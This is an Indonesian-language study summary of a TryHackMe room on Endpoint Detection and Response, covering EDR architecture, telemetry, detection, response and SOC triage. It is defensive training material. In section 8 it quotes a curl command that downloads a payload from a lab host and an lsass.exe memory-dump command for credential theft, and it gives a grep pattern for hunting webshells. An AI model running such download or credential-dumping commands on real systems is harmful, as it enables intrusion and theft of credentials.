# Resume Room: Endpoint Detection and Response (EDR)

Platform: TryHackMe | Tanggal: 21 Oktober 2026

Room ini membahas EDR sebagai salah satu tools inti SOC: arsitekturnya, perbedaannya dari antivirus, telemetri yang dikumpulkan, serta kemampuan deteksi dan responsnya.

## 1. Konsep Inti EDR

### 1.1 Definisi

**Endpoint Detection and Response (EDR)** adalah solusi keamanan untuk memantau, mendeteksi, dan merespons ancaman tingkat lanjut di level endpoint (laptop, PC, server, perangkat mobile).

EDR adalah nama **kategori** solusi, bukan nama produk. Produknya adalah CrowdStrike Falcon, SentinelOne, dan sejenisnya.

### 1.2 Mengapa EDR Dibutuhkan

Fungsi bisnis inti bergantung pada perangkat digital, dan ancaman siber terus meningkat. Mayoritas langkah keamanan organisasi melindungi jaringan, sementara adopsi Remote Work membuat perangkat berada di luar perlindungan perimeter.

EDR memberi perlindungan mendalam di mana pun endpoint berada: endpoint dipantau terus-menerus dan ancaman dideteksi.

### 1.3 Contoh Produk EDR

- CrowdStrike Falcon
- SentinelOne ActiveEDR
- Microsoft Defender for Endpoint
- OpenEDR
- Symantec EDR

Arsitektur dasarnya hampir sama antar produk, sedangkan fiturnya bervariasi. Seluruh screenshot di room ini berasal dari CrowdStrike Falcon.

### 1.4 Tiga Pilar EDR

**Visibility**, **Detection**, dan **Response**. Alurnya berurutan: data terlihat, lalu ancaman terdeteksi, lalu ancaman direspons.

## 2. Tiga Pilar EDR Secara Rinci

### 2.1 Visibility

Visibilitas adalah fitur yang membedakan EDR dari solusi endpoint lain. Data yang dikumpulkan mencakup modifikasi proses, modifikasi registry, modifikasi file dan folder, tindakan pengguna, dan lainnya.

Data disajikan terstruktur kepada analis:

- **Process tree** lengkap dengan timeline urutan aktivitas.
- Akses ke data historis endpoint untuk threat hunting atau keperluan lain.
- Setiap deteksi datang dengan konteks lengkap.

Pada process tree, setiap node mewakili satu proses dan garis antar node menunjukkan hubungan antar proses. Klik ikon **+** pada sebuah proses untuk melihat koneksi jaringan, perubahan registry, dan perubahan file yang terkait dengannya.

### 2.2 Detection

Deteksi EDR melampaui deteksi tradisional karena menggabungkan:

- Deteksi berbasis **signature**.
- Deteksi berbasis **perilaku**, misalnya aktivitas pengguna yang tidak terduga.
- Machine learning untuk mengenali penyimpangan dari baseline.
- Deteksi **fileless malware** yang hanya berada di memori.
- Pemasukan **custom IOC** untuk deteksi ancaman.

Dashboard deteksi menampilkan satu baris per deteksi dengan field severity, waktu, triggering file, hostname, username, command line, serta kolom **Tactic via Technique** yang memetakan deteksi ke MITRE. Klik sebuah deteksi untuk melihat detail lengkapnya.

### 2.3 Response

Tindakan dilakukan dari konsol EDR pusat pada endpoint mana pun. Analis dapat mengisolasi endpoint, menghentikan proses, mengkarantina file, atau terhubung ke host secara remote untuk menjalankan tindakan mandiri. Rincian tiap tindakan ada di bagian 7.

## 3. EDR vs Antivirus

### 3.1 Perbedaan Mendasar

Keduanya sama-sama melindungi endpoint, tetapi berbeda tingkat perlindungannya.

**Antivirus** mencocokkan file dengan daftar ancaman yang sudah dikenal (signature). Ancaman yang belum pernah teridentifikasi, atau yang menyamar sebagai proses sah, lolos dari pengecekan ini.

**EDR** memantau dan merekam perilaku endpoint secara terus-menerus, sehingga tetap menangkap aktivitas mencurigakan setelah ancaman lolos dari pemeriksaan awal.

EDR juga memberi visibilitas lintas organisasi. Contohnya, jika file mencurigakan terdeteksi di satu endpoint, EDR dapat memeriksa file itu di seluruh endpoint lain.

Pertanyaan yang diajukan EDR terhadap perilaku: apakah aktivitas mendekati area terlarang, apakah perilakunya mencurigakan, dan apakah ada objek ditinggalkan tanpa pengawasan.

### 3.2 Skenario Serangan: Respons AV vs EDR

Enam langkah serangan: (1) email phishing berisi dokumen Word dengan macro VBA berbahaya, (2) pengguna mengunduh dan membuka dokumen, (3) macro berjalan diam-diam dan memunculkan PowerShell, (4) PowerShell ter-obfuscate mengunduh payload tahap kedua, (5) payload di-inject ke `svchost.exe` yang sah, (6) penyerang mendapat akses remote.

| Langkah | Respons AV | Respons EDR |
|---|---|---|
| 1 | Tidak bereaksi bila file tanpa signature | Mencatat unduhan dan memantau |
| 2 | Tidak bereaksi, `winword.exe` sah | Merekam eksekusi `winword.exe` |
| 3 | Tidak bereaksi bila macro tanpa signature | Menandai hubungan parent-child tidak wajar `winword.exe` dan `PowerShell.exe` |
| 4 | Biasanya tidak mendeteksi script ter-obfuscate | Menandai eksekusi script ter-obfuscate |
| 5 | Tidak memantau injeksi memori | Mendeteksi process injection di `svchost.exe` |
| 6 | Tidak punya visibilitas level jaringan | Menandai koneksi outbound tak wajar dari `svchost.exe` |
| Akhir | Dapat dianggap bersih | Alert dengan attack chain lengkap dan opsi tindakan |

Beberapa AV modern memiliki visibilitas dan deteksi lebih baik, tetapi EDR tetap lebih unggul dalam deteksi dan respons.

## 4. Arsitektur EDR

### 4.1 Agent

**Agent** (disebut juga **sensor**) dipasang di setiap endpoint dan berperan sebagai mata dan telinga EDR. Tugasnya memantau semua aktivitas dan mengirim detailnya ke konsol secara real-time. Agent juga mampu melakukan deteksi dasar berbasis signature dan perilaku sendiri, lalu mengirimkannya ke konsol untuk memicu alert.

### 4.2 Console

**Console** adalah pusat pengelolaan endpoint dan analisis. Data dari agent dikorelasikan dengan logika kompleks dan algoritma machine learning, lalu dicocokkan dengan threat intelligence. Konsol berperan sebagai otak yang menghubungkan titik-titik data hingga membentuk deteksi (alert).

Dashboard konsol memberi gambaran menyeluruh status deteksi seluruh endpoint. Panel pada contoh: Current CrowdScore, New detections, SHA-based detections, Prevented malware by host, CrowdScore over time, Most recent detections, dan Detections by tactics.

### 4.3 Alur Setelah Deteksi

Analis SOC bertugas mengonfirmasi (acknowledge) dan memprioritaskan alert. EDR membantu dengan memberi severity: **Critical, High, Medium, Low, Informational**. Alert dengan severity tertinggi diinvestigasi lebih dulu.

Detail yang tersedia saat alert dibuka: file dieksekusi, proses dijalankan, upaya koneksi jaringan, modifikasi registry, dan lainnya. Berdasarkan data itu, analis menentukan apakah alert adalah **false positive** atau **true positive**. Bila true positive, tindakan dilakukan langsung dari konsol.

### 4.4 EDR dengan Tools Lain

EDR yang berdiri sendiri sudah cukup untuk mendeteksi dan merespons ancaman di endpoint, tetapi bekerja bersama solusi lain dalam ekosistem keamanan: Firewall, DLP, Email Security Gateway, IAM, dan lainnya. Semua solusi ini diintegrasikan ke **SIEM** yang menjadi titik pusat investigasi analis.

### 4.5 Batasan: Host-Only

EDR adalah solusi **host-centric** dan tidak mendeteksi ancaman level jaringan secara menyeluruh.

EDR melihat koneksi jaringan yang dibuat oleh endpoint tempat agent terpasang, misalnya `svchost.exe` yang membuka koneksi outbound. EDR tidak melihat lalu lintas jaringan luas atau perangkat tanpa agent.

## 5. Telemetri EDR

**Telemetry** adalah data yang dikumpulkan agent dari endpoint dan dikirim ke konsol. Telemetry diibaratkan black box endpoint yang berisi semua yang diperlukan untuk deteksi dan investigasi.

Aktivitas endpoint kebanyakan sah dan sulit dibedakan dari aktivitas berbahaya. Semakin banyak data, semakin baik penilaian yang bisa dibuat.

### 5.1 Jenis Telemetri Utama

- **Process executions and terminations**: melacak proses berjalan dan idle untuk menemukan hubungan parent-child mencurigakan, executable yang memulai proses, dan malware payload.
- **Network connections**: memantau koneksi ke server C2, penggunaan port tidak biasa, eksfiltrasi data, dan lateral movement.
- **Command line activity**: menangkap perintah di CMD, PowerShell, dan lainnya, termasuk script ter-obfuscate yang sering lolos dari antivirus.
- **Files and folders modifications**: melacak perubahan saat data staging, eksekusi ransomware, dan malicious file dropping.
- **Registry modifications**: registry menyimpan konfigurasi sistem Windows, dan banyak perubahannya terjadi selama aktivitas berbahaya.

### 5.2 Nilai Telemetri

Ancaman tingkat lanjut menyembunyikan aktivitasnya dengan utility yang sah. Satu aktivitas tampak tidak berbahaya, tetapi rangkaian telemetri yang detail menceritakan hal berbeda.

Bagi analis, telemetri memungkinkan pemahaman chain of events, penentuan root cause, dan rekonstruksi timeline serangan.

## 6. Kemampuan Deteksi

### 6.1 Behavioral Detection

Mengamati perilaku lengkap sebuah file, bukan hanya mencocokkan signature. Malware tingkat lanjut dibuat tampak bersih dan memakai proses sah.

Contoh: `winword.exe` yang memunculkan `PowerShell.exe` ditandai karena hubungan parent-child itu tidak wajar.

### 6.2 Anomaly Detection

EDR mempelajari perilaku baseline endpoint dan menandai penyimpangan darinya. Metode ini dapat menghasilkan false positive, tetapi konteks lengkap dari EDR membantu analis menilai legitimasinya.

Contoh: sebuah proses mengubah registry key auto-start, padahal itu bukan perilaku umum di endpoint tersebut.

### 6.3 IOC Matching

EDR terintegrasi dengan threat intelligence. Selain serangan zero-day, sebagian besar serangan punya indikator yang dipublikasikan di threat intelligence feed. Aktivitas yang cocok dengan IOC dikenal langsung ditandai.

Contoh: hash dari executable yang di-drop sebuah file unduhan dicocokkan dengan feed dan langsung ditandai.

### 6.4 MITRE ATT&CK Mapping

Setiap aktivitas yang ditandai dipetakan ke **Tactic** dan **Technique** MITRE (tahap serangannya).

Contoh: pembuatan scheduled task dipetakan ke Tactic **Persistence** dan Technique **Scheduled Task/Job**.

### 6.5 Machine Learning Algorithms

Model dilatih dengan dataset besar perilaku normal dan berbahaya. Model mengenali pola kompleks, yaitu rangkaian aktivitas yang secara individual tidak berbahaya tetapi secara keseluruhan berbahaya. Serangan fileless dan multi-staged intrusion sering terdeteksi lewat cara ini.

## 7. Kemampuan Respons

Respons dapat **otomatis** (policy untuk memblokir perilaku berbahaya yang dikenal) maupun **manual** (rentang kemampuan lebih luas).

### 7.1 Isolate Host

Memutus endpoint dari jaringan. Efektif untuk menahan serangan karena kebanyakan serangan dimulai dari satu endpoint lalu bergerak lateral ke endpoint lain. Isolasi tepat waktu menghentikan penyebarannya.

### 7.2 Terminate Process

Dipakai bila isolasi tidak layak, misalnya host yang menjalankan operasi bisnis inti dan isolasinya merugikan lebih besar. Menghentikan proses sudah cukup menetralkan aktivitas berbahaya. Lakukan dengan sadar, karena menghentikan proses sah dapat mengganggu endpoint.

### 7.3 Quarantine

File berbahaya dipindah ke lokasi terisolasi sehingga tidak bisa dieksekusi. Analis kemudian meninjau file untuk dipulihkan atau dihapus permanen.

### 7.4 Remote Access

Analis mengakses shell endpoint secara remote ketika respons bawaan tidak cukup. Dari sana analis mendapat visibilitas lebih dalam, menjalankan tindakan khusus, menjalankan script, atau mengumpulkan data dari host. Contohnya konsol **Real Time Response (RTR)** milik CrowdStrike Falcon.

### 7.5 Artefacts Collection

Pengambilan data dari endpoint untuk investigasi forensik atau pelaporan hukum tanpa akses fisik ke perangkat. Artefak yang paling umum:

- Memory dump
- Event logs
- Isi folder tertentu
- Registry hives

## 8. Command yang Muncul di Room

### 8.1 Pencarian Webshell via RTR

Contoh script di tab Edit & run scripts pada konsol RTR (host Linux):

```
grep -REi 'base64_decode|eval\(|assert\(|shell_exec|system\(|passthru|exec\(|popen\(|proc_open\(' /var/www/html
```

- `grep`: mencari pola teks di dalam file.
- `-R`: rekursif, masuk ke semua subdirektori.
- `-E`: extended regex, sehingga `|` (atau) dan `\(` (tanda kurung literal) dapat dipakai.
- `-i`: tidak membedakan huruf besar dan kecil.
- Pola: nama fungsi yang lazim disalahgunakan untuk eksekusi kode atau perintah dan penyamaran kode.
- `/var/www/html`: direktori target (web root).

### 8.2 Command Bawaan RTR

- `cat`: membaca file dari disk dan menampilkannya sebagai ASCII.
- `cd`: mengubah direktori kerja.
- `clear`: membersihkan layar.
- `cp`: menyalin file atau direktori.
- `encrypt`: mengenkripsi file dengan AES-256.
- `env`: menampilkan environment.

### 8.3 Command pada Contoh Investigasi

```
cmd.exe /c curl http://ayebd.thm/payload.exe -o C:\Users\Public\install.exe
```

- `cmd.exe /c`: menjalankan perintah yang diberikan lalu menutup sesi cmd.
- `curl`: tool transfer data via protokol seperti HTTP; di sini dipakai mengunduh file.
- `-o <path>`: menentukan nama dan lokasi file hasil unduhan.

```
syncsvc.exe -ma lsass.exe C:\Users\Public\dump_2025.dmp
```

- `syncsvc.exe`: binary tidak bertanda tangan yang berjalan dari folder Temp.
- `-ma lsass.exe`: argumen yang menargetkan memori proses `lsass.exe` untuk di-dump.
- `C:\Users\Public\dump_2025.dmp`: lokasi file hasil dump.

Perbedaan field di konsol: **Path** adalah lokasi fisik file executable itu sendiri. **Command Line** adalah perintah beserta argumennya, yang belum tentu memuat lokasi file tersebut.

## 9. Pola Triase pada Konsol EDR

Halaman detail deteksi berisi tab Summary, Process Info, IOC/Indicators, dan Actions/Response. Process Info menampilkan process chain beserta path, command line, parent process, hash, signed, behavior, aktivitas registry dan jaringan, serta label threat intel.

### 9.1 Contoh Pola Serangan

- **Initial access via dokumen berbahaya**: `winword.exe` memunculkan `cmd.exe`, lalu `curl.exe` mengunduh payload ke folder Public. File tersimpan tetapi belum dieksekusi, jadi ini tahap **staging**.
- **Credential dumping**: binary tidak bertanda tangan di folder Temp mengakses memori `lsass.exe`, menulis dump ke disk, lalu mencoba eksfiltrasi lewat koneksi outbound. EDR memblokir koneksi itu (status Blocked by EDR).

### 9.2 Indikator False Positive

Satu kasus (UpdateAgent.exe di AppData) menunjukkan cara menimbang konteks:

- Label threat intel menyebut tool IT internal yang dikenal.
- Confidence score rendah dan severity Medium.
- Faktor yang tetap mencurigakan: tidak bertanda tangan, berjalan dari AppData, dan membuat koneksi outbound.

Kesimpulan dibuat dari gabungan seluruh konteks, bukan dari satu indikator.

## 10. Glossary

- **EDR**: solusi untuk memantau, mendeteksi, dan merespons ancaman di endpoint.
- **Endpoint**: perangkat akhir seperti laptop, PC, server, dan mobile.
- **AV (Antivirus)**: perlindungan berbasis signature terhadap ancaman yang sudah dikenal.
- **SOC**: Security Operations Center, tim yang memantau dan merespons ancaman.
- **Agent / Sensor**: komponen EDR di endpoint yang memantau aktivitas dan mengirim data.
- **Console**: pusat pengelolaan, analisis, dan alert EDR.
- **Telemetry**: data aktivitas yang dikumpulkan agent dari endpoint.
- **Process tree**: grafik hubungan parent-child antar proses.
- **Parent-child relationship**: hubungan proses induk yang memunculkan proses anak.
- **Signature-based detection**: deteksi dengan mencocokkan ciri ancaman yang sudah dikenal.
- **Behavioral detection**: deteksi berdasarkan perilaku, bukan signature.
- **Anomaly detection**: deteksi penyimpangan dari baseline perilaku normal.
- **IOC**: Indicator of Compromise, petunjuk bahwa sistem telah dikompromi (misalnya hash file).
- **Threat intelligence**: informasi tentang ancaman dan indikatornya dari feed.
- **MITRE ATT&CK**: kerangka pemetaan taktik dan teknik serangan.
- **Tactic / Technique**: tujuan tahap serangan / cara mencapainya.
- **Fileless malware**: malware yang hidup di memori tanpa file di disk.
- **Obfuscation**: penyamaran script atau kode agar sulit dibaca dan dideteksi.
- **Macro / VBA**: script yang tertanam di dokumen Office.
- **Process injection**: penyisipan kode berbahaya ke dalam proses sah.
- **C2**: Command and Control, server pengendali yang dihubungi malware.
- **Lateral movement**: perpindahan penyerang dari satu endpoint ke endpoint lain.
- **Data exfiltration**: pengiriman data curian ke luar jaringan.
- **Staging**: tahap menaruh payload di target sebelum dieksekusi.
- **Credential dumping**: pencurian kredensial dari memori, misalnya dari `lsass.exe`.
- **Severity**: tingkat keparahan alert (Critical sampai Informational).
- **Triage**: penyaringan dan pemrioritasan alert oleh analis.
- **False positive / True positive**: alert keliru / alert benar-benar ancaman.
- **Isolate host**: memutus endpoint dari jaringan.
- **Quarantine**: memindahkan file berbahaya ke lokasi terisolasi.
- **RTR**: Real Time Response, konsol remote shell milik CrowdStrike Falcon.
- **Artefact**: data forensik dari endpoint (memory dump, event logs, registry hives, isi folder).
- **SIEM**: pusat pengumpulan dan analisis log dari berbagai solusi keamanan.
- **DLP**: Data Loss Prevention, pencegah kebocoran data.
- **IAM**: Identity and Access Management, pengelola identitas dan hak akses.
- **Email Security Gateway**: penyaring keamanan email.

## 11. Tools & Platform Rujukan

- **CrowdStrike Falcon**: produk EDR; dipakai sebagai contoh di seluruh room.
- **SentinelOne ActiveEDR**: produk EDR komersial.
- **Microsoft Defender for Endpoint**: produk EDR dari Microsoft.
- **OpenEDR**: produk EDR open-source.
- **Symantec EDR**: produk EDR dari vendor keamanan lama.
- **Falcon Real Time Response (RTR)**: konsol remote shell untuk menjalankan command dan script di endpoint.
- **MITRE ATT&CK**: kerangka pemetaan tactic dan technique.

Room tidak mencantumkan URL eksplisit untuk item di atas.

## 12. Catatan Ringkas untuk Ditulis Tangan

### 12.1 Konsep Dasar

- EDR — monitor, deteksi, respons ancaman di endpoint
- EDR = kategori, bukan nama produk
- Kebutuhan — remote work, perangkat di luar perimeter
- Produk — CrowdStrike Falcon, SentinelOne ActiveEDR, MS Defender for Endpoint, OpenEDR, Symantec EDR
- 3 pilar — Visibility, Detection, Response

### 12.2 Visibility

- Data — proses, registry, file/folder, aksi user
- Process tree — node = proses, garis = hubungan
- Ikon + — lihat koneksi, registry, file terkait proses
- Data historis — untuk threat hunting
- Deteksi selalu bawa konteks lengkap

### 12.3 Detection (Ringkas)

- Signature + behavior + ML + fileless + custom IOC
- Dashboard — severity, waktu, triggering file, host, user, command line
- Tactic via Technique — pemetaan MITRE

### 12.4 Response (Ringkas)

- Isolate host, terminate process, quarantine, remote access, artefacts collection
- Otomatis (policy) dan manual

### 12.5 EDR vs AV

- AV — cocok signature, ancaman dikenal saja
- EDR — pantau dan rekam perilaku, visibilitas lintas organisasi
- Skenario — Word, macro, PowerShell, payload, injection svchost, remote access
- AV lolos hampir semua langkah; EDR alert dengan attack chain penuh

### 12.6 Arsitektur

- Agent/sensor — di endpoint, kirim data real-time, deteksi dasar
- Console — korelasi, ML, threat intel, alert
- Dashboard — CrowdScore, New detections, Detections by tactics
- Severity — Critical, High, Medium, Low, Informational
- Alur — acknowledge, prioritas, investigasi, false/true positive, tindakan
- Terintegrasi — Firewall, DLP, Email Gateway, IAM, lalu SIEM
- Batasan — host-only; lihat koneksi dari endpoint ber-agent, bukan jaringan luas

### 12.7 Telemetri

- Telemetry — black box endpoint
- Process exec/termination — parent-child mencurigakan
- Network connections — C2, port aneh, exfil, lateral movement
- Command line — CMD/PowerShell, script ter-obfuscate
- File/folder — staging, ransomware, file drop
- Registry — banyak berubah saat aktivitas berbahaya
- Nilai — chain of events, root cause, timeline serangan

### 12.8 Teknik Deteksi

- Behavioral — winword.exe memunculkan PowerShell
- Anomaly — menyimpang dari baseline; bisa false positive
- IOC matching — hash cocok threat intel feed; kecuali zero-day
- MITRE mapping — scheduled task = Persistence + Scheduled Task/Job
- ML — rangkaian aksi tampak biasa tapi pola berbahaya; fileless, multi-stage

### 12.9 Teknik Respons

- Isolate host — putus jaringan; cegah lateral movement
- Terminate process — host bisnis inti; hati-hati proses sah
- Quarantine — file ke lokasi terisolasi; restore atau hapus
- Remote access — shell remote; RTR CrowdStrike
- Artefacts — memory dump, event logs, isi folder, registry hives

### 12.10 Command dan Switch

- grep -REi 'pola' /var/www/html — cari pola di web root
- grep -R — rekursif
- grep -E — extended regex
- grep -i — abaikan huruf besar/kecil
- Pola — base64_decode, eval(, assert(, shell_exec, system(, passthru, exec(, popen(, proc_open(
- RTR — cat (baca file), cd (pindah direktori), clear (bersihkan layar), cp (salin), encrypt (AES-256), env (tampil environment)
- cmd.exe /c — jalankan perintah lalu tutup
- curl URL -o path — unduh dan simpan ke path
- syncsvc.exe -ma lsass.exe file.dmp — dump memori lsass
- Path = lokasi file; Command Line = perintah dan argumen

### 12.11 Triase dan Contoh Kasus

- Detail deteksi — Summary, Process Info, IOC/Indicators, Actions/Response
- Staging — payload tersimpan, belum dieksekusi
- Credential dumping — akses memori lsass.exe, tulis dump, coba exfil, diblokir EDR
- False positive — threat intel tool internal, confidence rendah, severity Medium
- Tetap curiga — unsigned, jalan dari AppData, koneksi outbound
- Putusan berdasarkan seluruh konteks

### 12.12 Istilah Wajib Hapal

- IOC — indikator kompromi
- C2 — server pengendali malware
- Lateral movement — pindah antar endpoint
- Exfiltration — kirim data curian keluar
- Fileless — malware di memori
- Obfuscation — penyamaran kode
- Process injection — kode berbahaya masuk proses sah
- Credential dumping — curi kredensial dari memori
- Triage — saring dan prioritaskan alert
- SIEM — pusat log dari berbagai solusi keamanan
